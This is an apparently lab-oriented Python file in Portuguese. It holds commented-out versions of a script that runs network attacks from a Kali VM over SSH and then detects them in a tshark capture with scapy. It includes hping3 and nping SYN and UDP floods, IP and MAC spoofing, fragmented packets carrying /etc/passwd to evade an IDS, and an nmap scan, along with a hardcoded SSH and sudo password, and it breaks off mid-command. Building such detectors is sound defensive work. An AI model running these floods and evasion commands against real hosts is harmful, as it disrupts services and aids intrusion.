#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":
#                 syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#             elif 'A' in flags and 'S' not in flags:
#                 ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#     for ip in syn_count:
#         syns = syn_count[ip]
#         acks = ack_count.get(ip, 0)
#         ratio = acks / syns if syns > 0 else 0
#         if syns > 100 and ratio < 0.1:
#             print(f"⚠️ SYN Flood detectado de {ip} ({syns} SYNs, {acks} ACKs, ratio={ratio:.2f})")
#             break
#     else:
#         print("✅ Nenhum SYN Flood detectado.")
#
# # UDP Flood
# elif opcao == "3":
#     udp_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(UDP):
#             src = pkt[IP].src
#             udp_count[src] = udp_count.get(src, 0) + 1
#     for ip, count in udp_count.items():
#         if count > 10:  # REDUZIDO para facilitar testes
#             print(f"⚠️ UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#             break
#     else:
#         print("✅ Nenhum UDP Flood detectado.")




# # NÃO FUNCIONANDO O MAC SPOOFING
#
# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, ARP
#
# # Função auxiliar
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# # Menu
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# opcao = input("\nSelecione o tipo de ataque (1-4): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_falso = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# # Detectar interface VMnet8
# interfaces_output = subprocess.check_output([r"C:\Program Files\Wireshark\tshark.exe", "-D"], text=True)
# interface_id = None
# for linha in interfaces_output.splitlines():
#     if "VMnet8" in linha:
#         interface_id = linha.split(".")[0].strip()
#         break
#
# if interface_id is None:
#     print("❌ Interface VMnet8 não encontrada.")
#     exit()
#
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)\n")
#
# # Iniciar captura
# nome_arquivo = "captura_ataque.pcapng"
# print("🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id, "-w", nome_arquivo
# ])
#
# time.sleep(2)  # Tempo para iniciar a captura
#
# # SSH e ataque
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && sudo ip link set eth0 address {mac_falso} && sudo ip link set eth0 up && sudo dhclient eth0 && ping -c 5 {ip_vitima} && sudo ip link set eth0 down && sudo ip link set eth0 address 00:0c:29:f7:61:06 && sudo ip link set eth0 up && sudo dhclient eth0"
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# pkts = rdpcap(nome_arquivo)
#
# # IP Spoofing
# if opcao == "1":
#     ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#     suspeitos = []
#     for pkt in pkts:
#         if IP in pkt:
#             src = pkt[IP].src
#             if ip_privado(src) and src not in ips_confiaveis:
#                 suspeitos.append(f"⚠️ Spoofing suspeito: {src} → {pkt[IP].dst}")
#     if suspeitos:
#         print("🔍 IPs suspeitos detectados:\n")
#         for alerta in suspeitos:
#             print(alerta)
#     else:
#         print("✅ Nenhum spoofing detectado.")
#
# # SYN Flood
# elif opcao == "2":
#     syn_count = {}
#     ack_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":
#                 syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#             elif 'A' in flags and 'S' not in flags:
#                 ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#     for ip in syn_count:
#         syns = syn_count[ip]
#         acks = ack_count.get(ip, 0)
#         ratio = acks / syns if syns > 0 else 0
#         if syns > 100 and ratio < 0.1:
#             print(f"⚠️ SYN Flood detectado de {ip} ({syns} SYNs, {acks} ACKs, ratio={ratio:.2f})")
#             break
#     else:
#         print("✅ Nenhum SYN Flood detectado.")
#
# # UDP Flood
# elif opcao == "3":
#     udp_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(UDP):
#             src = pkt[IP].src
#             udp_count[src] = udp_count.get(src, 0) + 1
#     for ip, count in udp_count.items():
#         if count > 500:
#             print(f"⚠️ UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#             break
#     else:
#         print("✅ Nenhum UDP Flood detectado.")
#
# # MAC Spoofing
# elif opcao == "4":
#     ip_mac_map = {}
#     spoofings_detectados = []
#     for pkt in pkts:
#         if pkt.haslayer(ARP):
#             ip = pkt[ARP].psrc
#             mac = pkt[ARP].hwsrc
#             if ip in ip_mac_map and ip_mac_map[ip] != mac:
#                 spoofings_detectados.append((ip, ip_mac_map[ip], mac))
#             else:
#                 ip_mac_map[ip] = mac
#
#     if spoofings_detectados:
#         print("⚠️ MAC Spoofing detectado!")
#         for ip, mac_original, mac_novo in spoofings_detectados:
#             print(f"🔍 IP {ip} estava originalmente com MAC {mac_original}, mas também foi visto com {mac_novo}")
#     else:
#         print("✅ Nenhum MAC Spoofing detectado.")




# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
#
# # Função auxiliar
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# # Menu
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
#
# opcao = input("\nSelecione o tipo de ataque (1-5): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# # Auto-detecta interface correta (ex: VMnet8 = 4)
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# # Início captura
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)  # Tempo para iniciar captura
#
# # SSH
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 "
#         f"-E /etc/passwd -p 80 -f {ip_vitima}"
#     )
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# # IP Spoofing
# if opcao == "1":
#     ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#     suspeitos = []
#     for pkt in pkts:
#         if IP in pkt:
#             src = pkt[IP].src
#             if ip_privado(src) and src not in ips_confiaveis:
#                 suspeitos.append(f"⚠️ Spoofing suspeito: {src} → {pkt[IP].dst}")
#     if suspeitos:
#         print("🔍 IPs suspeitos detectados:\n")
#         for alerta in suspeitos:
#             print(alerta)
#     else:
#         print("✅ Nenhum spoofing detectado.")
#
# # SYN Flood
# elif opcao == "2":
#     syn_count = {}
#     ack_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":
#                 syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#             elif 'A' in flags and 'S' not in flags:
#                 ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#     for ip in syn_count:
#         syns = syn_count[ip]
#         acks = ack_count.get(ip, 0)
#         ratio = acks / syns if syns > 0 else 0
#         if syns > 100 and ratio < 0.1:
#             print(f"⚠️ SYN Flood detectado de {ip} ({syns} SYNs, {acks} ACKs, ratio={ratio:.2f})")
#             break
#     else:
#         print("✅ Nenhum SYN Flood detectado.")
#
# # UDP Flood
# elif opcao == "3":
#     udp_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(UDP):
#             src = pkt[IP].src
#             udp_count[src] = udp_count.get(src, 0) + 1
#     for ip, count in udp_count.items():
#         if count > 500:
#             print(f"⚠️ UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#             break
#     else:
#         print("✅ Nenhum UDP Flood detectado.")
#
# # MAC Spoofing
# elif opcao == "4":
#     print("🔍 MAC Spoofing executado. Verifique os efeitos manualmente (análise de ARP ou logs de rede).")
#
# # Fragmentação Suspeita
# elif opcao == "5":
#     frag_detectado = False
#     for pkt in pkts:
#         if IP in pkt:
#             frag_offset = pkt[IP].frag
#             mf_flag = pkt[IP].flags.MF if hasattr(pkt[IP].flags, "MF") else pkt[IP].flags & 0x1
#             if frag_offset > 0 or mf_flag:
#                 print(f"⚠️ Fragmento detectado de {pkt[IP].src} → {pkt[IP].dst}")
#                 frag_detectado = True
#     if not frag_detectado:
#         print("✅ Nenhum pacote fragmentado detectado.")


# FUNCIONANDO COM ITEM 6

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# # Menu
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
#
# opcao = input("\nSelecione o tipo de ataque (1-6): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# # Interface
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# # Captura Tshark
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# # SSH
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 "
#         f"-E /etc/passwd -p 80 -f {ip_vitima}"
#     )
# elif opcao == "6":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
#     )
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# # IP Spoofing
# if opcao == "1":
#     ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#     suspeitos = []
#     for pkt in pkts:
#         if IP in pkt:
#             src = pkt[IP].src
#             if ip_privado(src) and src not in ips_confiaveis:
#                 suspeitos.append(f"⚠️ Spoofing suspeito: {src} → {pkt[IP].dst}")
#     if suspeitos:
#         print("🔍 IPs suspeitos detectados:\n")
#         for alerta in suspeitos:
#             print(alerta)
#     else:
#         print("✅ Nenhum spoofing detectado.")
#
# # SYN Flood
# elif opcao == "2":
#     syn_count = {}
#     ack_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":
#                 syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#             elif 'A' in flags and 'S' not in flags:
#                 ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#     for ip in syn_count:
#         syns = syn_count[ip]
#         acks = ack_count.get(ip, 0)
#         ratio = acks / syns if syns > 0 else 0
#         if syns > 100 and ratio < 0.1:
#             print(f"⚠️ SYN Flood detectado de {ip} ({syns} SYNs, {acks} ACKs, ratio={ratio:.2f})")
#             break
#     else:
#         print("✅ Nenhum SYN Flood detectado.")
#
# # UDP Flood
# elif opcao == "3":
#     udp_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(UDP):
#             src = pkt[IP].src
#             udp_count[src] = udp_count.get(src, 0) + 1
#     for ip, count in udp_count.items():
#         if count > 500:
#             print(f"⚠️ UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#             break
#     else:
#         print("✅ Nenhum UDP Flood detectado.")
#
# # MAC Spoofing
# elif opcao == "4":
#     print("🔍 MAC Spoofing executado. Verifique os efeitos manualmente (análise de ARP ou logs de rede).")
#
# # Fragmentação Suspeita
# elif opcao == "5":
#     frag_detectado = False
#     for pkt in pkts:
#         if IP in pkt:
#             frag_offset = pkt[IP].frag
#             mf_flag = pkt[IP].flags.MF if hasattr(pkt[IP].flags, "MF") else pkt[IP].flags & 0x1
#             if frag_offset > 0 or mf_flag:
#                 print(f"⚠️ Fragmento detectado de {pkt[IP].src} → {pkt[IP].dst}")
#                 frag_detectado = True
#     if not frag_detectado:
#         print("✅ Nenhum pacote fragmentado detectado.")
#
# # TTL Alterado
# elif opcao == "6":
#     ttl_suspeito = False
#     limiar_ttl = 5
#     for pkt in pkts:
#         if IP in pkt and pkt[IP].ttl <= limiar_ttl:
#             print(f"⚠️ TTL suspeito: {pkt[IP].src} → {pkt[IP].dst} (TTL={pkt[IP].ttl})")
#             ttl_suspeito = True
#     if not ttl_suspeito:
#         print("✅ Nenhuma anomalia de TTL detectada.")




# FUNCIONANDO OPCAO 7

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# # Menu
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
# print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
#
# opcao = input("\nSelecione o tipo de ataque (1-7): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# # Interface
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# # Captura Tshark
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\Program Files\Wireshark\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# # SSH
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# # Comandos de ataque
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 "
#         f"-E /etc/passwd -p 80 -f {ip_vitima}"
#     )
# elif opcao == "6":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
#     )
# elif opcao == "7":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
#     )
# else:
#     print("❌ Opção inválida.")
#     exit()
#
# print(f"🚀 Executando ataque:\n{comando}\n")
# stdin, stdout, stderr = ssh.exec_command(comando)
# print(stdout.read().decode())
# print(stderr.read().decode())
# ssh.close()
#
# print("⌛ Aguardando término do ataque...")
# time.sleep(12)
#
# print("🛑 Encerrando captura...\n")
# tshark_proc.terminate()
# time.sleep(2)
#
# print("📂 Analisando pacotes capturados...\n")
# try:
#     pkts = rdpcap(nome_arquivo)
# except Exception as e:
#     print(f"❌ Erro ao abrir arquivo pcap: {e}")
#     exit()
#
# # IP Spoofing
# if opcao == "1":
#     ips_confiaveis = {ip_spoofado, "192.168.1.6", "192.168.1.3", "192.168.1.13"}
#     suspeitos = []
#     for pkt in pkts:
#         if IP in pkt:
#             src = pkt[IP].src
#             if ip_privado(src) and src not in ips_confiaveis:
#                 suspeitos.append(f"⚠️ Spoofing suspeito: {src} → {pkt[IP].dst}")
#     if suspeitos:
#         print("🔍 IPs suspeitos detectados:\n")
#         for alerta in suspeitos:
#             print(alerta)
#     else:
#         print("✅ Nenhum spoofing detectado.")
#
# # SYN Flood
# elif opcao == "2":
#     syn_count = {}
#     ack_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":
#                 syn_count[ip_src] = syn_count.get(ip_src, 0) + 1
#             elif 'A' in flags and 'S' not in flags:
#                 ack_count[ip_src] = ack_count.get(ip_src, 0) + 1
#     for ip in syn_count:
#         syns = syn_count[ip]
#         acks = ack_count.get(ip, 0)
#         ratio = acks / syns if syns > 0 else 0
#         if syns > 100 and ratio < 0.1:
#             print(f"⚠️ SYN Flood detectado de {ip} ({syns} SYNs, {acks} ACKs, ratio={ratio:.2f})")
#             break
#     else:
#         print("✅ Nenhum SYN Flood detectado.")
#
# # UDP Flood
# elif opcao == "3":
#     udp_count = {}
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(UDP):
#             src = pkt[IP].src
#             udp_count[src] = udp_count.get(src, 0) + 1
#     for ip, count in udp_count.items():
#         if count > 500:
#             print(f"⚠️ UDP Flood detectado do IP {ip} ({count} pacotes UDP).")
#             break
#     else:
#         print("✅ Nenhum UDP Flood detectado.")
#
# # MAC Spoofing
# elif opcao == "4":
#     print("🔍 MAC Spoofing executado. Verifique os efeitos manualmente (análise de ARP ou logs de rede).")
#
# # Fragmentação Suspeita
# elif opcao == "5":
#     frag_detectado = False
#     for pkt in pkts:
#         if IP in pkt:
#             frag_offset = pkt[IP].frag
#             mf_flag = pkt[IP].flags.MF if hasattr(pkt[IP].flags, "MF") else pkt[IP].flags & 0x1
#             if frag_offset > 0 or mf_flag:
#                 print(f"⚠️ Fragmento detectado de {pkt[IP].src} → {pkt[IP].dst}")
#                 frag_detectado = True
#     if not frag_detectado:
#         print("✅ Nenhum pacote fragmentado detectado.")
#
# # TTL Alterado
# elif opcao == "6":
#     ttl_suspeito = False
#     limiar_ttl = 5
#     for pkt in pkts:
#         if IP in pkt and pkt[IP].ttl <= limiar_ttl:
#             print(f"⚠️ TTL suspeito: {pkt[IP].src} → {pkt[IP].dst} (TTL={pkt[IP].ttl})")
#             ttl_suspeito = True
#     if not ttl_suspeito:
#         print("✅ Nenhuma anomalia de TTL detectada.")
#
# # TCP SYN Scan
# elif opcao == "7":
#     scan_detectado = False
#     conexoes_syn = {}
#
#     for pkt in pkts:
#         if pkt.haslayer(IP) and pkt.haslayer(TCP):
#             ip_src = pkt[IP].src
#             flags = pkt[TCP].flags
#             if flags == "S":  # Apenas SYN
#                 conexoes_syn[ip_src] = conexoes_syn.get(ip_src, 0) + 1
#
#     for ip, total in conexoes_syn.items():
#         if total > 50:  # Threshold para detectar comportamento suspeito
#             print(f"⚠️ Possível TCP SYN Scan detectado do IP {ip} ({total} conexões SYN)")
#             scan_detectado = True
#
#     if not scan_detectado:
#         print("✅ Nenhum TCP SYN Scan detectado.")


# opção 9 funcionando

# import subprocess
# import time
# import paramiko
# import ipaddress
# from scapy.all import rdpcap, IP, TCP, UDP, Raw
# import os
#
# def ip_privado(ip_str):
#     ip_obj = ipaddress.ip_address(ip_str)
#     redes_privadas = [
#         ipaddress.ip_network("10.0.0.0/8"),
#         ipaddress.ip_network("172.16.0.0/12"),
#         ipaddress.ip_network("192.168.0.0/16"),
#     ]
#     return any(ip_obj in rede for rede in redes_privadas)
#
# print("🔐 Simulador de Ataques de Rede (Terminal)\n")
# print("1️⃣ IP Spoofing")
# print("2️⃣ TCP SYN Flood")
# print("3️⃣ UDP Flood")
# print("4️⃣ MAC Spoofing - com problema")
# print("5️⃣ Fragmentação Suspeita (evasão de IDS)")
# print("6️⃣ TTL Alterado (Ocultação de Tráfego)")
# print("7️⃣ TCP SYN Scan (Escaneamento de Portas)")
# print("8️⃣ Retransmissões Excessivas")
#
# opcao = input("\nSelecione o tipo de ataque (1-8): ").strip()
#
# ip_kali = input("🖥️ IP da máquina Kali: ").strip()
# ip_vitima = input("🎯 IP da máquina vítima: ").strip()
#
# if opcao == "1":
#     ip_spoofado = input("🎭 IP spoofado (falso): ").strip()
# elif opcao == "4":
#     mac_fake = input("🧬 MAC a ser falsificado (ex: 00:0c:29:fb:6a:d6): ").strip()
#
# interface_id = "4"
# print(f"\n🎯 Interface de captura detectada: {interface_id} (VMnet8)")
#
# nome_arquivo = "captura_ataque.pcap"
# print("\n🎥 Iniciando captura com Tshark...\n")
# tshark_proc = subprocess.Popen([
#     r"C:\\Program Files\\Wireshark\\tshark.exe", "-i", interface_id,
#     "-w", nome_arquivo, "-F", "pcap"
# ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#
# time.sleep(2)
#
# print("🔐 Conectando na VM Kali...\n")
# ssh = paramiko.SSHClient()
# ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
# ssh.connect(hostname=ip_kali, username="alessandro", password="npfnm1msv")
#
# if opcao == "1":
#     comando = f"echo 'npfnm1msv' | sudo -S hping3 -a {ip_spoofado} -S {ip_vitima} -p 80 -c 10"
# elif opcao == "2":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s hping3 {ip_vitima} -S -p 80 --flood"
# elif opcao == "3":
#     comando = f"echo 'npfnm1msv' | sudo -S timeout 10s nping --udp -p 80 --rate 3000 {ip_vitima}"
# elif opcao == "4":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S ip link set eth0 down && "
#         f"sudo ip link set eth0 address {mac_fake} && "
#         f"sudo ip link set eth0 up && "
#         f"ping -c 5 {ip_vitima} && "
#         f"sudo ip link set eth0 down && "
#         f"sudo ip link set eth0 address 00:0c:29:f7:61:06 && "
#         f"sudo ip link set eth0 up"
#     )
# elif opcao == "5":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -d 120 "
#         f"-E /etc/passwd -p 80 -f {ip_vitima}"
#     )
# elif opcao == "6":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S hping3 -c 50 -t 1 -S -p 80 {ip_vitima}"
#     )
# elif opcao == "7":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S nmap -sS -p 1-1000 {ip_vitima}"
#     )
# elif opcao == "8":
#     comando = (
#         f"echo 'npfnm1msv' | sudo -S tc qdisc add dev eth0 root netem loss 50% && "
#         f"curl -I http://{ip_vitima} && "
